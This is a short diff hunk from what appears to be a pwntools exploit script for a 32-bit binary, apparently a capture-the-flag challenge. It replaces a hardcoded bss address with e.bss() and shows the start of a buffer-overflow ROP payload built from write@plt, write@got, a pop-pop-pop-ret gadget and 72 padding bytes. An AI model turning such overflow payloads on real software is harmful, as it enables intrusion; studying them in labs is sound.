@@ -38,7 +38,7 @@ write_plt = e.plt['write']
 write_got = e.got['write']
 
 pppr = 0x8048689
-bss = 0x0804a040
+bss = e.bss()
 
 payload = ""
 payload += 'A'*72
